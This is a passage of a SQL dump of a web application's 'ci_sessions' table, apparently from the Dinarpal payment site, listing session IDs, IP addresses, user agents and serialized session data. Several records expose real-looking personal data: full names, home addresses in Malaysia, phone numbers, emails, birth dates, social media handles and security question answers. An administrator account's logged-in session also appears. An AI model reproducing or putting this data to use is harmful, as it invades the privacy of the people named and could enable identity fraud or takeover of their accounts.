('9ebdcd1deb696dcb09bf9c5fe7d0e7c1', '203.82.90.30', 'Mozilla/5.0 (Linux; Android 4.2.2; Lenovo A850i Bu', 1461420780, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('9ed80661d089bc51f09e21508bf4307c', '66.249.71.180', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1459089235, ''),
('9f028119ae4274d9d0d58a5809e184b1', '115.164.210.248', 'WhatsApp/2.16.2/i', 1461496191, 'a:1:{s:12:"me_id_parent";s:88:"E3Z0_dHuRx5n4dSoYvkvplwOuz97ir2110ay3JOGD0_e9RN8gqMZi5uksDVQSMo768UDMg_Ntz3ojRqCyl6bbw==";}'),
('9f32c696aa863ec54763a49784bae9c8', '66.249.64.175', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461799409, ''),
('9f4094517cdf6cd11b162c5813f8acd8', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461637608, ''),
('9f53f93cf07acb0b2107c017f6ed6fe3', '45.79.87.104', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461102961, ''),
('9f5c6c7a5e23ac1d023d460cae9a3bff', '180.76.15.145', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461613697, ''),
('9f698eda5031bfcba548a8775518ce87', '113.210.56.35', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461551441, 'a:1:{s:12:"me_id_parent";s:88:"vcWx8fEf1MCw98ybBba8Uk18w92IYkFZbXqG8liSEAW9_OZkB0-jkgQ_nP6wdacuMbkRMj4vjknwgoM7b45yCA==";}'),
('9f76b08ff3755f7dffeda17c3d3a5ce7', '203.113.152.10', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKi', 1461535517, ''),
('9f81d996ec8c14b877e288855f6704e3', '156.31.197.27', 'Mozilla/5.0 (Linux; Android 4.4.4; 3006 Build/KTU8', 1461558278, 'a:1:{s:15:"flash:old:error";s:279:"Password validation failure ( your choise is weak ) <br /><br />Password too short!<br />Password must include at least one number!<br />Password must include at least one letter!<br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";}'),
('9fa7a00a6c5dc18abeaab00a46f26a47', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461738377, ''),
('a00e674286143f3ae8e778f8da58b9b4', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461494586, ''),
('a011d2016bfe4f9a78f898215a158d9d', '180.76.15.152', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461573649, ''),
('a04430c5614bc514d63e5f301f15b0c8', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461447600, ''),
('a05e88cb81cd5d8a08b09e6b70d4c40d', '180.76.15.153', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461669704, ''),
('a07e31ef9312a7d82bd00047a3c2caf0', '141.8.132.32', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247724, ''),
('a0948856b7628a6bcee7ccbe930ea26a', '66.249.69.68', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461736923, ''),
('a0bbcbacda1cc3730c504664697e1d02', '46.118.156.3', 'Mozilla/3.0 (x86 [en] Windows NT 5.1; Sun)', 1461457354, ''),
('a0f322bb3d1e491f2ebf28f62c59dd8b', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461577239, ''),
('a11324eb683a263a148c7c537c3bdd17', '183.171.168.61', 'Mozilla/5.0 (Linux; Android 4.1.2; ST26a Build/11.', 1461422873, ''),
('a118cbba6935c6c0665e35369764d76a', '211.123.208.20', 'Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100', 1461240937, ''),
('a17a4326c80cbbadac0d544e47209b51', '157.55.39.159', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461800062, ''),
('a1a08ea638a7c6db112556b92bf4c824', '66.249.69.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461454270, ''),
('a2197db3d5732a6ae414db4c254374e6', '144.76.8.132', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461892145, ''),
('a25d0ae0ccbee4f18c4b98b4469ed227', '1.9.100.66', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461728494, ''),
('a2686fe65802826bf5b891d24be052cc', '180.76.15.140', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461257239, ''),
('a274cbbbbe46a0976fea8694e1c7d6f3', '180.76.15.22', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461156509, ''),
('a2969ea234544b5c2d296991925d32f3', '5.39.222.159', 'masscan/1.0 (https://github.com/robertdavidgraham/', 1461552038, ''),
('a2ee2ee2b8955e0bd6a1555c0a565e91', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461403326, 'a:56:{s:5:"me_id";s:1:"3";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-23T10:50:47+02:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;s:12:"gs_sub_total";d:600;s:11:"gs_discount";i:0;s:6:"gs_fee";d:6;s:6:"gs_gst";d:0.35999999999999998667732370449812151491641998291015625;s:11:"gs_datetime";s:19:"2016-04-23 11:22:28";s:7:"gs_amil";s:18:"Ustaz Nizam Rashid";}'),
('a2f6ff82ba2810b6e0b7afbc89a0420a', '180.76.15.17', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461932236, ''),
('a3759bd91a7c168299c755d901f68ada', '91.194.84.106', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461298738, ''),
('a3a46de65913ebfb4b35398830e5316f', '66.249.66.33', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461247763, ''),
('a3b4c2788b3d89723fe6d3e9fcd7d990', '60.51.39.87', 'Mozilla/5.0 (Linux; U; Android 2.3.3; en-gb; GT-P1', 1461472418, 'a:1:{s:12:"me_id_parent";s:88:"b_gSds10InWeeaPGy8LAmqeRj9rweFZUs27R3wCT5DJEVlrKb_ccxSc1mUjNWjkPNlLzawBf9yWTcuVbW-SuFQ==";}'),
('a3ed2680e837a130b46a2d40e2241f83', '66.249.66.66', 'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuratio', 1461870343, ''),
('a40c554e980859b268eee37e484db340', '180.76.15.161', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461756588, ''),
('a41ced84fadeaf21aea297d3b35599ad', '51.254.121.188', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461757693, ''),
('a469c76db83ee6f302ab7d158c8dab20', '91.121.221.15', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461751949, ''),
('a4c1f7417cccfc1444403edf80513748', '180.76.15.157', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461778132, ''),
('a4c5f001f23b2efa52267e27075894bc', '115.134.161.155', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461209789, ''),
('a4f182f54a1f79607f89b44257c18175', '66.249.66.50', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461285916, ''),
('a4f8a34f4e04bb8d43e51dfb9e4bf491', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898645, ''),
('a55ab104598ec878e9f4b740c6cb962e', '45.55.229.99', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko', 1461718303, ''),
('a576c30d9bad0619ebbf625c2c8d4758', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160575, ''),
('a5cc7608890f7cfa818da3ecf4bafef7', '51.254.121.188', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461757700, ''),
('a5d50fc221fc8038651bddcc06d655d3', '66.249.64.175', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461798076, ''),
('a5e189854684edba04075c5b61190be3', '14.1.198.187', 'Mozilla/5.0 (Linux; Android 4.2.1; i9480 Build/JOP', 1461499850, 'a:1:{s:12:"me_id_parent";s:88:"nU4RiKV5OdBV-7iiD3-w1CFscWTRc5g-sARmFHK5hU7SiDljbxiGC9XEx5UFLFuIasx2tQucsVnai-ieDHpcmA==";}'),
('a622ae308b6fb13b774e9e48b5d67f3e', '180.76.15.15', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461856882, ''),
('a63de2e00799cbb796209302859e1f65', '91.209.51.22', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461154914, ''),
('a66a4a3b34562e8defd3b0b82b11530f', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;', 1461699347, ''),
('a67858de49cd6b2f21b0d69d3b135554', '66.249.77.14', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461209206, ''),
('a6994a8b3067566de44c3319e636e736', '66.249.69.45', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461588509, ''),
('a69ff7a9732d57bd754e641366ba3d3d', '173.252.74.109', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461231328, 'a:1:{s:12:"me_id_parent";s:88:"aeDwnYlApUE0eS4tD_OQnh7fpGpZlyWiu2bNps-sDAVE8qjOJvFyhuMhFqahhCwy4d6uJ2Ey4uDg3_bHy7MjPw==";}'),
('a6cbad4c852921a635a28649d909556d', '180.76.15.139', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461842931, ''),
('a6ed19ad40c708d10b3299307c3846ba', '113.210.54.244', 'Mozilla/5.0 (Linux; Android 4.2.2; C2105 Build/15.', 1461420809, 'a:1:{s:15:"flash:old:error";s:24:"Your email is not valid!";}'),
('a77081e834b5ecd97c00e8d31a6b8e3b', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461544499, ''),
('a7832e562d578737c39cff24564f7046', '115.164.53.74', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461422043, ''),
('a7abb6f0326a0fb9d44547ea25392d0b', '66.249.69.116', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461414967, ''),
('a7acb659254f62d1b841583a63180536', '54.146.27.35', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv', 1461815639, ''),
('a7df34b94a4f4d6a688d991b24927ef4', '157.55.39.90', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461593167, ''),
('a7e1969468bef2f8a852bf353621bd00', '183.171.171.55', 'Mozilla/5.0 (Linux; Android 4.4.4; Lenovo S939 Bui', 1461497319, 'a:1:{s:12:"me_id_parent";s:88:"8yIPwCHJjQQHqbqL25p54rwy3NvVODbgv3-sIVdNnG0YJT4Kv3gJi0zS8cfRuwtW0mg12Tn-G6wKL8VUrO2cKA==";}'),
('a7f3f2a1f4554af3bacea68dd55a2ad4', '183.171.26.121', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461815839, 'a:1:{s:12:"me_id_parent";s:8:"BTAKPQ==";}'),
('a83a06fbd9dec2602fb5948b8d09de55', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461939432, ''),
('a841ba6c64314ce5686f9d13c8cf9589', '103.1.69.7', 'Mozilla/5.0 (Linux; Android 6.0.1; D6653 Build/23.', 1461474254, 'a:1:{s:12:"me_id_parent";s:88:"AjMb_mHTcgKRMJcoFuL5hB58CBs7ry-5AprTz0wafT1X7WjNZBsDmiGt9828ponmh7EQsdKEykPpSKTJS1h7KA==";}'),
('a89e3e039182282ddaa5351a313afd9b', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461767078, ''),
('a89fa91cbfa0d116f555ce73c1f47210', '180.76.15.160', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461821367, ''),
('a8abb5f26fd7c82aa7e013c88877e908', '157.55.39.163', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461260004, ''),
('a8ad45a34ca8ec8e425b28fa577fa26f', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461907784, ''),
('a8bc6d5a7f1a00976369120a372f55de', '93.158.152.60', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461727664, ''),
('a8dd08abe42342a31b86f19075382b32', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232007, ''),
('a909d66b1931fbce5787a5b7621c6247', '144.76.29.162', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461110658, ''),
('a920ff79ca8f0e278cf7873a49561e12', '157.55.39.159', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461803067, ''),
('a921b25451f924bf3c0ef69f94f091ef', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461262911, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T02:21:49+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('a921f000b44be7973bfc7c39fd704521', '17.142.157.156', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) Ap', 1461485376, 'a:1:{s:12:"me_id_parent";s:88:"5rREHLDcd--3_tWLm3rcChOiZHB61npD_xnlZs0ChwL9iVoKptS7rfU9EuQ7aB0388NiziLwB7PTht1cOeOIYw==";}'),
('a9248634cc7b7aeb9e0897644fcecaba', '180.76.15.139', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461849705, ''),
('a941642d7a346468ad8c31474d11f772', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461877538, ''),
('a959096695e2e8732eb95e7344603178', '93.115.95.201', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461282644, ''),
('a97c905faca8f9a11f6779414aa99618', '180.76.15.27', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461299424, ''),
('a9bb8e5784f515b7506a8efbcabc755d', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461505471, ''),
('a9c456ea5ab092ccf7e7fbb643cb6fc1', '216.163.188.231', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko', 1461644403, ''),
('aa2a514ea59fa1d2afcb3d89e7407f1c', '203.82.85.33', 'Mozilla/5.0 (Linux; Android 5.1; ASUS_Z00VD Build/', 1461913163, 'a:1:{s:12:"me_id_parent";s:8:"UGQANA==";}'),
('aa2cb056144d0975ea2c125cd4ce5b93', '180.76.15.28', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461214033, ''),
('aa32e3689eb2ef08f42cc5d1c350696a', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461507692, ''),
('aa466b8a1be6e39ac1ecbc33adde2f0e', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767063, ''),
('aa874a2e9b36a57b4df1f9be33258505', '103.198.52.1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461550505, ''),
('aaa177fb0cb706787ff794a6f1982d63', '208.115.113.93', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461578834, ''),
('aabf4a4c2b5deef2ac11e5f24fdd068d', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461773842, ''),
('aac4add7699a04832a469a174f349803', '69.30.198.202', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461481024, ''),
('aaec0b0763e682ca88bee944ac8bc63a', '141.212.122.161', 'Go http package', 1461872790, ''),
('aaf29eb988582c08496abf1ccf4180d9', '133.242.52.175', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Geck', 1461680808, ''),
('ab3b08b9d64af33eb98ad606c53f838d', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461554568, ''),
('ab40335b122ede9865239de1c0a5e76b', '182.118.25.214', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461304417, ''),
('ab7672a1c8d9e366f6f882b1cf477804', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461676555, ''),
('abc102f1eb4301391b2f2320268fa2b1', '180.76.15.16', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461484188, ''),
('ac0bf67e10cf2a1eab1b384ce605db68', '180.76.15.141', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461210116, ''),
('ac1212544868b60d01601f9783d2af08', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429464, ''),
('ac1ba37eddd46d576738788b67637e69', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461541677, ''),
('ac39802816624111d805867db47c460a', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232044, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('ac7ca7287d6dd995df8903706e9885dd', '183.171.166.201', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-A500F Build/', 1461497075, 'a:1:{s:12:"me_id_parent";s:88:"H_WILUybi-9VyVvBLjWQ3-CvKSzOGVCQW2CmXEC4nytKr6gBhCNKKfxsCyLh7L-27EpK5hpqhXUgydiZs_MXjA==";}'),
('ac85a310c5ac0cab21df8819c5e2e27b', '175.136.140.216', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (K', 1461547113, ''),
('ac869b573e6c74cad579a63a9c83a509', '173.252.90.242', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461407964, 'a:1:{s:12:"me_id_parent";s:88:"h0DFkkRo77FLNg77BTyZw7mxYaTEqq7il_-JMD9z8S3tnMq7UrYxGo2S9Y5sr0h3J4PZZk0LDjtmTG1bBipq-A==";}'),
('acaab285c83e9953424d68c8b15a40fa', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1459437902, ''),
('ace46b4029776bab6e9a8020d9d9991b', '157.55.39.218', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461262138, ''),
('ace6ae71638ab90b7964221b285bb762', '183.171.232.146', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-gb; Lenov', 1461437716, 'a:1:{s:12:"me_id_parent";s:88:"ZTQrdrP6oy1hhNeO-jZqVENQiuUeBvIIJ5FyMWXTpihQQMOhhb5zpmwrDcoby0oC1LiRvixWA-7WERT_4kmupA==";}'),
('ad11b181fc720c0bce02d26f5c43facb', '136.243.152.18', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461513986, ''),
('ad26ea802815eb08398d0922fe934564', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461631756, ''),
('ad2da2c5e6116ee18616c2ad2e3ac21a', '178.63.86.11', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461204122, ''),
('ad2e51cec180caa894e9dec4214bfc52', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232011, ''),
('ad5c24abe6f134761314341e141b8f13', '113.240.237.35', 'Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100', 1461745060, ''),
('ad670626295b435dcb5fed8b1ad85896', '164.132.161.36', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461551437, ''),
('ad8703aac7d55573f3563477100bc0f8', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461878506, '');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('adc5ebc25ef89967bb204ee551cbfa41', '175.143.113.162', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461566911, 'a:50:{s:5:"me_id";s:1:"9";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:19:"ruxaini89@gmail.com";s:11:"me_lastname";s:19:"ruxaini89@gmail.com";s:11:"me_username";s:19:"ruxaini89@gmail.com";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:19:"ruxaini89@gmail.com";s:14:"me_unique_link";s:32:"57a476e2b37f20f08708e171d9d58d4c";s:11:"me_address1";s:0:"";s:8:"me_city1";s:0:"";s:9:"me_state1";s:0:"";s:12:"me_postcode1";s:0:"";s:11:"me_country1";s:0:"";s:11:"me_address2";s:0:"";s:8:"me_city2";s:0:"";s:9:"me_state2";s:0:"";s:12:"me_postcode2";s:0:"";s:11:"me_country2";s:0:"";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0135096088";s:13:"me_birth_date";s:10:"2016-03-29";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:19:"ruxaini89@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 19:11:04";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-23T22:13:24+08:00";s:12:"me_magic_num";s:32:"57a476e2b37f20f08708e171d9d58d4c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('add79a4866481db01bc0316027744909', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461731983, ''),
('addaafcefc80516c48f01aba2ce8dfc7', '216.218.206.68', '0', 1461418330, ''),
('addeb9dc46d4ae27156412e4a581228c', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461741715, ''),
('ade0fdaa6d86a59b45518da8da4ac28f', '66.220.152.1', 'facebookexternalhit/1.1', 1461429616, ''),
('adfb047ce8e51299ff234e45535bc2e0', '210.195.95.114', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461481011, 'a:53:{s:5:"me_id";s:2:"36";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:4:"alon";s:11:"me_lastname";s:4:"alon";s:11:"me_username";s:4:"alon";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:4:"alon";s:14:"me_unique_link";s:32:"d4b9967b6c3f9cdb6210cb408e82a5be";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:22:"alonthegreat@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 14:55:26";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"7fee64c2276e0d711cca8555c0d4c4f1";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";}'),
('ae06b90a1c8854edac07ff8ac7a343da', '113.210.60.20', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461674799, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('ae4a2187734d339558ffebaaf4b2f8a9', '211.24.232.114', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461654311, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my 